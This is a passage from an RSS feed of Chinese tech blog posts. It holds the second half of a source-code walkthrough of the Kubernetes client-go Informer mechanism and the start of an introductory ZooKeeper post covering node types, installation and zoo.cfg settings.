&lt;p&gt;sharedIndexInformer里面会创建sharedProcessor，设置List&amp;amp;Watch的回调函数，创建了一个indexer，我们这里看一下NewIndexer是怎么创建indexer的：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func NewIndexer(keyFunc KeyFunc, indexers Indexers) Indexer {
        return &amp;amp;cache{
                cacheStorage: NewThreadSafeStore(indexers, Indices{}),
                keyFunc:      keyFunc,
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;NewIndexer方法创建了一个cache，它的keyFunc是DeletionHandlingMetaNamespaceKeyFunc，即接受一个object，生成它的&lt;strong&gt;namepace/name&lt;/strong&gt;的字符串。cache里面的数据会存放到cacheStorage中，它是一个threadSafeMap用来存储资源对象并自带索引功能的本地存储。&lt;/p&gt;
&lt;h3 id=&quot;注册eventhandler事件&quot;&gt;注册EventHandler事件&lt;/h3&gt;
&lt;p&gt;EventHandler事件的注册是通过informer的AddEventHandler方法进行的。在调用AddEventHandler方法的时候，传入一个cache.ResourceEventHandlerFuncs结构体：&lt;/p&gt;
&lt;p&gt;文件位置：tools/cache/shared_informer.go&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func (s *sharedIndexInformer) AddEventHandler(handler ResourceEventHandler) {
        s.AddEventHandlerWithResyncPeriod(handler, s.defaultEventHandlerResyncPeriod)
}

func (s *sharedIndexInformer) AddEventHandlerWithResyncPeriod(handler ResourceEventHandler, resyncPeriod time.Duration) {
        s.startedLock.Lock()
        defer s.startedLock.Unlock()

        ...
        //初始化监听器
        listener := newProcessListener(handler, resyncPeriod, determineResyncPeriod(resyncPeriod, s.resyncCheckPeriod), s.clock.Now(), initialBufferSize)
        //如果informer还没启动，那么直接将监听器加入到processor监听器列表中
        if !s.started {
                s.processor.addListener(listener)
                return
        } 
        //如果informer已经启动，那么需要加锁
        s.blockDeltas.Lock()
        defer s.blockDeltas.Unlock()

        s.processor.addListener(listener)
        //然后将indexer中缓存的数据写入到listener中
        for _, item := range s.indexer.List() {
                listener.add(addNotification{newObj: item})
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;AddEventHandler方法会调用到AddEventHandlerWithResyncPeriod方法中，然后调用newProcessListener初始化listener。&lt;/p&gt;
&lt;p&gt;接着会校验informer是否已经启动，如果没有启动，那么直接将监听器加入到processor监听器列表中并返回；如果informer已经启动，那么需要加锁将监听器加入到processor监听器列表中，然后将indexer中缓存的数据写入到listener中。&lt;/p&gt;
&lt;p&gt;需要注意的是listener.add方法会调用processorListener的add方法，这个方法会将数据写入到addCh管道中：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func (p *processorListener) add(notification interface{}) {
        p.addCh &amp;lt;- notification
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;addCh管道里面数据是用来处理事件回调的，后面我会说到。&lt;/p&gt;
&lt;p&gt;大致的流程如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.luozhiyun.com/20201018000210.png&quot; alt=&quot;image-20201017213620364&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;启动informer模块&quot;&gt;启动Informer模块&lt;/h3&gt;
&lt;p&gt;最后我们在上面的demo中会使用sharedIndexInformer的Run方法来启动Informer模块。&lt;/p&gt;
&lt;p&gt;文件位置：tools/cache/shared_informer.go&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func (s *sharedIndexInformer) Run(stopCh &amp;lt;-chan struct{}) {
        defer utilruntime.HandleCrash()
        //初始化DeltaFIFO队列
        fifo := NewDeltaFIFOWithOptions(DeltaFIFOOptions{
                KnownObjects:          s.indexer,
                EmitDeltaTypeReplaced: true,
        })

        cfg := &amp;amp;Config{
                //设置Queue为DeltaFIFO队列
                Queue:            fifo,
                //设置List&amp;amp;Watch的回调函数
                ListerWatcher:    s.listerWatcher,
                ObjectType:       s.objectType,
                //设置Resync周期
                FullResyncPeriod: s.resyncCheckPeriod,
                RetryOnError:     false,
                //判断有哪些监听器到期需要被Resync
                ShouldResync:     s.processor.shouldResync,
                Process:           s.HandleDeltas,
                WatchErrorHandler: s.watchErrorHandler,
        }

        func() {
                s.startedLock.Lock()
                defer s.startedLock.Unlock()
                //异步创建controller
                s.controller = New(cfg)
                s.controller.(*controller).clock = s.clock
                s.started = true
        }()
 
        processorStopCh := make(chan struct{})
        var wg wait.Group
        defer wg.Wait()              // Wait for Processor to stop
        defer close(processorStopCh) // Tell Processor to stop
        wg.StartWithChannel(processorStopCh, s.cacheMutationDetector.Run)
    //调用run方法启动processor
        wg.StartWithChannel(processorStopCh, s.processor.run)

        defer func() {
                s.startedLock.Lock()
                defer s.startedLock.Unlock()
                s.stopped = true  
        }()
        //启动controller
        s.controller.Run(stopCh)
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这段代码主要做了以下几件事：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;调用NewDeltaFIFOWithOptions方法初始化DeltaFIFO队列；&lt;/li&gt;
&lt;li&gt;初始化Config结果体，作为创建controller的参数；&lt;/li&gt;
&lt;li&gt;异步创建controller；&lt;/li&gt;
&lt;li&gt;调用run方法启动processor；&lt;/li&gt;
&lt;li&gt;调用run方法启动controller；&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;下面我们看看sharedProcessor的run方法做了什么：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func (p *sharedProcessor) run(stopCh &amp;lt;-chan struct{}) {
        func() {
                ...
                //遍历监听器
                for _, listener := range p.listeners {
                        //下面两个方法是核心的事件call back的方法
                        p.wg.Start(listener.run)
                        p.wg.Start(listener.pop)
                }
                p.listenersStarted = true
        }()
        ...
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;run方法会调用processorListener的run方法和pop方法，这两个方法合在一起完成了事件回调。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func (p *processorListener) add(notification interface{}) {
        p.addCh &amp;lt;- notification
}

func (p *processorListener) pop() {
        defer utilruntime.HandleCrash()
        defer close(p.nextCh) // Tell .run() to stop

        var nextCh chan&amp;lt;- interface{}
        var notification interface{}
        for {
                select {
                case nextCh &amp;lt;- notification:
                        // Notification dispatched
                        var ok bool
                        notification, ok = p.pendingNotifications.ReadOne()
                        if !ok { // Nothing to pop
                                nextCh = nil // Disable this select case
                        }
                case notificationToAdd, ok := &amp;lt;-p.addCh:
                        if !ok {
                                return
                        }
                        if notification == nil {  
                                notification = notificationToAdd
                                nextCh = p.nextCh
                        } else {  
                                p.pendingNotifications.WriteOne(notificationToAdd)
                        }
                }
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这段代码，我把add方法也贴到这里了，是因为监听的事件都是从这个方法传入的，然后写入到addCh管道中。&lt;/p&gt;
&lt;p&gt;pop方法在select代码块中会获取addCh管道中的数据，第一个循环的时候notification是nil，所以会将nextCh设置为p.nextCh；第二个循环的时候会将数据写入到nextCh中。&lt;/p&gt;
&lt;p&gt;当notification不为空的时候是直接将数据存入pendingNotifications缓存中的，取也是从pendingNotifications中读取。&lt;/p&gt;
&lt;p&gt;下面我们看看run方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func (p *processorListener) run() { 
        stopCh := make(chan struct{})
        wait.Until(func() {
                for next := range p.nextCh {
                        switch notification := next.(type) {
                        case updateNotification:
                                p.handler.OnUpdate(notification.oldObj, notification.newObj)
                        case addNotification:
                                p.handler.OnAdd(notification.newObj)
                        case deleteNotification:
                                p.handler.OnDelete(notification.oldObj)
                        default:
                                utilruntime.HandleError(fmt.Errorf(&quot;unrecognized notification: %T&quot;, next))
                        }
                }
                // the only way to get here is if the p.nextCh is empty and closed
                close(stopCh)
        }, 1*time.Second, stopCh)
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;run每秒遍历一次nextCh中的数据，然后根据不同的notification类型执行不同的回调方法，这里会回调到我们在main方法中注册的eventHandler。&lt;/p&gt;
&lt;p&gt;下面我们再回到sharedIndexInformer的Run方法中往下走，会运行controller的Run方法。&lt;/p&gt;
&lt;p&gt;文件位置：tools/cache/controller.go&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func (c *controller) Run(stopCh &amp;lt;-chan struct{}) {
        ...
        //创建Reflector
        r := NewReflector(
                c.config.ListerWatcher,
                c.config.ObjectType,
                c.config.Queue,
                c.config.FullResyncPeriod,
        )
        ...
        //启动Reflector
        wg.StartWithChannel(stopCh, r.Run)
        //每秒中循环调用DeltaFIFO队列的pop方法，
        wait.Until(c.processLoop, time.Second, stopCh)
        wg.Wait()
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里对应Informer运行原理里面Informer上部分创建Reflector并进行监听，和下部分循环调用DeltaFIFO队列的pop方法进行分发。&lt;/p&gt;
&lt;h3 id=&quot;启动reflector进行监听&quot;&gt;启动Reflector进行监听&lt;/h3&gt;
&lt;p&gt;Reflector的Run方法最后会调用到Reflector的ListAndWatch方法进行监听获取资源。ListAndWatch代码会分为两部分，一部分是List，一部分是Watch。&lt;/p&gt;
&lt;p&gt;我们先看List部分代码：&lt;/p&gt;
&lt;p&gt;代码位置：tools/cache/reflector.go&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func (r *Reflector) ListAndWatch(stopCh &amp;lt;-chan struct{}) error {
        ...
        if err := func() error {
                ...
                go func() {
                        defer func() {
                                if r := recover(); r != nil {
                                        panicCh &amp;lt;- r
                                }
                        }() 
                        pager := pager.New(pager.SimplePageFunc(func(opts metav1.ListOptions) (runtime.Object, error) {
                                //根据参数获取pod 列表
                                return r.listerWatcher.List(opts)
                        }))
                        ...

                        list, paginatedResult, err = pager.List(context.Background(), options)
                        ...
                        close(listCh)
                }()
                ...
                //获取资源版本号
                resourceVersion = listMetaInterface.GetResourceVersion()
                initTrace.Step(&quot;Resource version extracted&quot;)
                //将资源数据转换成资源对象列表
                items, err := meta.ExtractList(list)
                ...
                //将资源对象列表中的资源对象和资源版本号存储至DeltaFIFO队列中
                if err := r.syncWith(items, resourceVersion); err != nil {
                        return fmt.Errorf(&quot;unable to sync list result: %v&quot;, err)
                }
                ...
                r.setLastSyncResourceVersion(resourceVersion)
                return nil
        }(); err != nil {
                return err
        }
        ...
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这部分的代码会分为如下几个部分：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;调用listerWatcher.List方法，获取资源下的所有对象的数据，这个方法会通过api调用到apiServer获取资源列表，代码我在上面已经贴出来了；&lt;/li&gt;
&lt;li&gt;调用listMetaInterface.GetResourceVersion获取资源版本号；&lt;/li&gt;
&lt;li&gt;调用meta.ExtractList方法将资源数据转换成资源对象列表；&lt;/li&gt;
&lt;li&gt;将资源对象列表中的资源对象和资源版本号存储至DeltaFIFO队列中；&lt;/li&gt;
&lt;li&gt;最后调用setLastSyncResourceVersion方法更新资源版本号；&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;下面看看Watch部分的代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func (r *Reflector) ListAndWatch(stopCh &amp;lt;-chan struct{}) error {
        ...
        for {
                ...
                //调用clientset客户端api与apiServer建立长连接，监控指定资源的变更
                w, err := r.listerWatcher.Watch(options)
                ...
                //处理资源的变更事件
                if err := r.watchHandler(start, w, &amp;amp;resourceVersion, resyncerrc, stopCh); err != nil {
                        ...
                        return nil
                }
        } 
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里会循环调用clientset客户端api与apiServer建立长连接，监控指定资源的变更，如果监控到有资源变更，那么会调用watchHandler处理资源的变更事件。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func (r *Reflector) watchHandler(start time.Time, w watch.Interface, resourceVersion *string, errc chan error, stopCh &amp;lt;-chan struct{}) error {
        ... 
loop:
        for {
                select {
                case &amp;lt;-stopCh:
                        return errorStopRequested
                case err := &amp;lt;-errc:
                        return err
                case event, ok := &amp;lt;-w.ResultChan():
                        ...
                        // 获取资源版本号
                        newResourceVersion := meta.GetResourceVersion()
                        switch event.Type {
                        //将添加资源事件添加到DeltaFIFO队列中
                        case watch.Added:
                                err := r.store.Add(event.Object)
                                if err != nil {
                                        utilruntime.HandleError(fmt.Errorf(&quot;%s: unable to add watch event object (%#v) to store: %v&quot;, r.name, event.Object, err))
                                }
                        //将更新资源事件添加到DeltaFIFO队列中
                        case watch.Modified:
                                err := r.store.Update(event.Object)
                                if err != nil {
                                        utilruntime.HandleError(fmt.Errorf(&quot;%s: unable to update watch event object (%#v) to store: %v&quot;, r.name, event.Object, err))
                                }
                        //将删除资源事件添加到DeltaFIFO队列中
                        case watch.Deleted: 
                                err := r.store.Delete(event.Object)
                                if err != nil {
                                        utilruntime.HandleError(fmt.Errorf(&quot;%s: unable to delete watch event object (%#v) from store: %v&quot;, r.name, event.Object, err))
                                }
                        ...
                        *resourceVersion = newResourceVersion
                        r.setLastSyncResourceVersion(newResourceVersion)
                        eventCount++
                }
        }
        ...     
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;watchHandler方法会根据传入的资源类型调用不同的方法转换成不同的Delta然后存入到DeltaFIFO队列中。&lt;/p&gt;
&lt;h3 id=&quot;processloop分发deltafifo队列中任务&quot;&gt;processLoop分发DeltaFIFO队列中任务&lt;/h3&gt;
&lt;p&gt;processLoop方法，以1s为周期，周期性的执行。&lt;/p&gt;
&lt;p&gt;文件位置：tools/cache/controller.go&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func (c *controller) processLoop() {
        for {
                obj, err := c.config.Queue.Pop(PopProcessFunc(c.config.Process))
                if err != nil {
                        if err == ErrFIFOClosed {
                                return
                        }
                        if c.config.RetryOnError {
                                // This is the safe way to re-enqueue.
                                c.config.Queue.AddIfNotPresent(obj)
                        }
                }
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里会循环将DeltaFIFO队列中数据pop出队，然后交给Process方法进行处理，Process方法是在上面调用sharedIndexInformer的Run方法的数据设置，设置的方法是sharedIndexInformer的HandleDeltas方法。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func (s *sharedIndexInformer) HandleDeltas(obj interface{}) error {
        s.blockDeltas.Lock()
        defer s.blockDeltas.Unlock()

        // from oldest to newest
        //根据obj的Type类型进行分发
        for _, d := range obj.(Deltas) {
                switch d.Type {
                case Sync, Replaced, Added, Updated:
                        s.cacheMutationDetector.AddObject(d.Object)
                        //如果缓存中存在该对象
                        if old, exists, err := s.indexer.Get(d.Object); err == nil &amp;amp;&amp;amp; exists {
                                //更新indexr
                                if err := s.indexer.Update(d.Object); err != nil {
                                        return err
                                }

                                isSync := false
                                switch {
                                case d.Type == Sync:
                                        // Sync events are only propagated to listeners that requested resync
                                        isSync = true
                                case d.Type == Replaced:
                                        //新老对象获取版本号进行比较
                                        if accessor, err := meta.Accessor(d.Object); err == nil {
                                                if oldAccessor, err := meta.Accessor(old); err == nil {
                                                        // Replaced events that didn't change resourceVersion are treated as resync events
                                                        // and only propagated to listeners that requested resync
                                                        isSync = accessor.GetResourceVersion() == oldAccessor.GetResourceVersion()
                                                }
                                        }
                                }
                                s.processor.distribute(updateNotification{oldObj: old, newObj: d.Object}, isSync)
                        //      如果缓存中不存在该对象
                        } else {
                                if err := s.indexer.Add(d.Object); err != nil {
                                        return err
                                }
                                s.processor.distribute(addNotification{newObj: d.Object}, false)
                        }
                case Deleted:
                        if err := s.indexer.Delete(d.Object); err != nil {
                                return err
                        }
                        s.processor.distribute(deleteNotification{oldObj: d.Object}, false)
                }
        }
        return nil
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;HandleDeltas会与indexer缓存交互更新我们从Delta FIFO中取到的内容，之后通过&lt;code&gt;s.processor.distribute()&lt;/code&gt;进行消息的分发。&lt;/p&gt;
&lt;p&gt;在distribute中，sharedProcesser通过&lt;code&gt;listener.add(obj)&lt;/code&gt;向每个listener分发该object。而该函数中又执行了&lt;code&gt;p.addCh &amp;lt;- notification&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func (p *sharedProcessor) distribute(obj interface{}, sync bool) {
        p.listenersLock.RLock()
        defer p.listenersLock.RUnlock()

        if sync {
                for _, listener := range p.syncingListeners {
                        listener.add(obj)
                }
        } else {
                for _, listener := range p.listeners {
                        listener.add(obj)
                }
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里可以结合上面的&lt;code&gt;p.wg.Start(listener.run)&lt;/code&gt;和&lt;code&gt;p.wg.Start(listener.pop)&lt;/code&gt;方法来进行理解，这里将notification传入到addCh管道之后会触发EventHandler事件。&lt;/p&gt;
&lt;p&gt;这里我用一张图总结一下informer的Run方法流程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.luozhiyun.com/20201018000217.png&quot; alt=&quot;image-20201017233145402&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;至此，我们分析完了informer的所有机制。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;通过上面分析，我们全面熟悉了k8s是如何通过Informer机制实现ListAndWatch获取并监视 API 对象变化。&lt;/p&gt;
&lt;p&gt;熟悉了Informer与Reflector是如何协同进行数据的传递，但是我这里有点遗憾的是限于篇幅，没有去详细的讲解DeltaFIFO队列里面是如何进行数据的存储与获取，实际上这个队列的实现也是非常的有意思的。&lt;/p&gt;
&lt;p&gt;对于Indexer来说，我在文章里面也只说到了获取DeltaFIFO队列的数据后更新到Indexer的ThreadSafeMap中，但是并没有讲ThreadSafeMap这个存储是如何做的，里面的索引又是如何建立的，这些各位同学感兴趣的也可以去研究一下。&lt;/p&gt;
&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://www.kubernetes.org.cn/2693.html&quot;&gt;https://www.kubernetes.org.cn/2693.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/kubernetes/sample-controller/blob/master/docs/controller-client-go.md&quot;&gt;https://github.com/kubernetes/sample-controller/blob/master/docs/controller-client-go.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/&quot;&gt;https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzU1OTAzNzc5MQ==&amp;amp;mid=2247484052&amp;amp;idx=1&amp;amp;sn=cec9f4a1ee0d21c5b2c51bd147b8af59&amp;amp;chksm=fc1c2ea4cb6ba7b283eef5ac4a45985437c648361831bc3e6dd5f38053be1968b3389386e415&amp;amp;scene=21#wechat_redirect&quot;&gt;https://mp.weixin.qq.com/s?__biz=MzU1OTAzNzc5MQ==&amp;amp;mid=2247484052&amp;amp;idx=1&amp;amp;sn=cec9f4a1ee0d21c5b2c51bd147b8af59&amp;amp;chksm=fc1c2ea4cb6ba7b283eef5ac4a45985437c648361831bc3e6dd5f38053be1968b3389386e415&amp;amp;scene=21#wechat_redirect&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 17 Oct 2020 16:04:00 +0000</pubDate>
<dc:creator>luozhiyun</dc:creator>
<og:description>转载请声明出处哦~，本篇文章发布于luozhiyun的博客：https://www.luozhiyun.com 由于这部分的代码是在client-go 中，所以使用的源码版本是client-go 1.</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/luozhiyun/p/13833160.html</dc:identifier>
</item>
<item>
<title>Zookeeper(1)---初识 - 白露非霜</title>
<link>http://www.cnblogs.com/nijunyang/p/13833127.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/nijunyang/p/13833127.html</guid>
<description>&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;一．&lt;/span&gt;ZK&lt;span&gt;简述&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;Zookeeper，&lt;span&gt;它是一个分布式程序的协调服务，它主要是用来解决分布式应用中的一些数据管理问题，比如集群管理，分布式应用配置，分布式锁，服务注册&lt;/span&gt;/&lt;span&gt;发现等等。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;它是一个类似于文件系统的树状结构。每个目录被称为&lt;/span&gt;znode&lt;span&gt;，可以删除目录，添加子目录这些操作，不同的是每个&lt;/span&gt;&lt;span&gt;znode&lt;/span&gt;&lt;span&gt;上面都是存储数据的，如下图：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1216484/202010/1216484-20201017234422946-1942356563.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt; &lt;span&gt;客户端可以监听这些目录节点，当结点数据发生改变，节点被删除，增加子节点时，&lt;/span&gt;zk&lt;span&gt;会通知客户端。以此来实现很多分布式数据管理的操作。比如我们把服务的一些配置数据放在某个节点上面，所有的该服务都监听这个节点，一旦节点数据（配置）发生变化，所有的该服务都会收到通知，然后各自更新配置，就不用每个服务都手动去更新配置了。&lt;/span&gt;&lt;/p&gt;

&lt;p align=&quot;justify&quot;&gt;ZK&lt;span&gt;的节点有四种类型的：&lt;/span&gt;&lt;/p&gt;

&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;持久节点（&lt;/span&gt;PERSISTENT&lt;span&gt;）：客户端与&lt;/span&gt;ZK&lt;span&gt;断开连接之后，节点依旧存在&lt;/span&gt;&lt;/p&gt;

&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;持久序号节点（&lt;/span&gt;PERSISTENT_SEQUENTIAL&lt;span&gt;）：同持久节点，只是&lt;/span&gt;ZK&lt;span&gt;会给该结点进行顺序编号&lt;/span&gt;&lt;/p&gt;

&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;临时节点（&lt;/span&gt;EPHEMERAL&lt;span&gt;）：客户端与&lt;/span&gt;ZK&lt;span&gt;断开连接之后，节点会被删除&lt;/span&gt;&lt;/p&gt;

&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;临时序号节点（&lt;/span&gt;EPHEMERAL_SEQUENTIAL&lt;span&gt;）：同临时节点，只是&lt;/span&gt;ZK&lt;span&gt;会给该结点进行顺序编号&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt; &lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt; &lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;二、&lt;span&gt;安装和配置&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt; &lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;简单有个认识之后，安装来体验一下：&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt; &lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;ZK&lt;span&gt;是&lt;/span&gt;&lt;span&gt;java&lt;/span&gt;&lt;span&gt;开发的，所以先要有&lt;/span&gt;&lt;span&gt;JDK&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt; &lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;a href=&quot;https://zookeeper.apache.org/releases.html#download&quot;&gt;&lt;span&gt;https://zookeeper.apache.org/releases.html#download&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt; &lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;下载解压这个就赘述了&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt; &lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;解压之后的&lt;/span&gt;/conf&lt;span&gt;目录下面有默认的配置文件&lt;/span&gt;&lt;span&gt;zoo_sample.cfg&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt; &lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;重命名或者复制一份出来：&lt;/span&gt;cp zoo_sample.cfg  zoo.cfg&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt; &lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;然后去解压后的&lt;/span&gt;bin&lt;span&gt;目录下面，执行&lt;/span&gt;&lt;span&gt;zkServer.sh&lt;/span&gt;&lt;span&gt;脚本 默认会使用&lt;/span&gt;&lt;span&gt;zoo.cfg&lt;/span&gt;&lt;span&gt;配置文件；或者指定配置文件启动：&lt;/span&gt;&lt;span&gt;./zkServer.sh start ../conf/zoo.cfg&lt;/span&gt; &lt;span&gt;如果是&lt;/span&gt;&lt;span&gt;windows&lt;/span&gt;&lt;span&gt;环境那么就执行&lt;/span&gt;&lt;span&gt;cmd&lt;/span&gt;&lt;span&gt;的脚本就可以了。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt; &lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1216484/202010/1216484-20201017234536978-1967387443.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;


&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;至此&lt;/span&gt;zk&lt;span&gt;服务就启动了，默认的端口号&lt;/span&gt;&lt;span&gt;2181.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;现在我们再回来看看&lt;/span&gt;zk&lt;span&gt;的一些配置信息（&lt;/span&gt;&lt;span&gt;zoo.cfg&lt;/span&gt;&lt;span&gt;文件）：&lt;/span&gt;&lt;/p&gt;

&lt;p class=&quot;15&quot;&gt;&lt;em&gt;&lt;strong&gt;tickTime=2000   zookeeper时间配置中的基本单位 (毫秒)&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p class=&quot;15&quot;&gt;&lt;em&gt;&lt;strong&gt;initLimit=10 &lt;span&gt;允许&lt;/span&gt;follower初始化连接到leader最大时长，它表示tickTime时间倍数 即:initLimit*tickTime&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p class=&quot;15&quot;&gt;&lt;em&gt;&lt;strong&gt;syncLimit=5 &lt;span&gt;允许&lt;/span&gt;follower与leader数据同步最大时长,它表示tickTime时间倍数 &lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p class=&quot;15&quot;&gt;&lt;em&gt;&lt;strong&gt;dataDir=/tmp/zookeeper  &lt;span&gt;数据存储目录&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p class=&quot;15&quot;&gt;&lt;em&gt;&lt;strong&gt;clientPort=2181   &lt;span&gt;对客户端提供的端口号&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p class=&quot;15&quot;&gt;&lt;em&gt;&lt;strong&gt;maxClientCnxns=60 &lt;span&gt;单个客户端与&lt;/span&gt;zookeeper最大并发连接数&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p class=&quot;15&quot;&gt;&lt;em&gt;&lt;strong&gt;autopurge.snapRetainCount=3  &lt;span&gt;保存的数据快照数量，之外的将会被清除&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;autopurge.purgeInterval=1  &lt;span&gt;自动触发清除&lt;/span&gt;&lt;span&gt;快照&lt;/span&gt;&lt;span&gt;任务时间间隔&lt;/span&gt;&lt;span&gt;（&lt;/span&gt;&lt;span&gt;超过&lt;/span&gt;autopurge.snapRetainCount&lt;span&gt;配置的&lt;/span&gt;&lt;span&gt;）&lt;/span&gt;&lt;span&gt;，小时为单位。默认为&lt;/span&gt;0&lt;span&gt;，表示不自动清除。&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;


&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;三、&lt;span&gt;体验&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;先使用自带客户端来连接玩玩&lt;/span&gt; bin&lt;span&gt;目录下面&lt;/span&gt;&lt;span&gt;./zkCli.sh&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;连接之后可以使用&lt;/span&gt;help&lt;span&gt;查看指令&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1216484/202010/1216484-20201017234623620-1376432235.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;


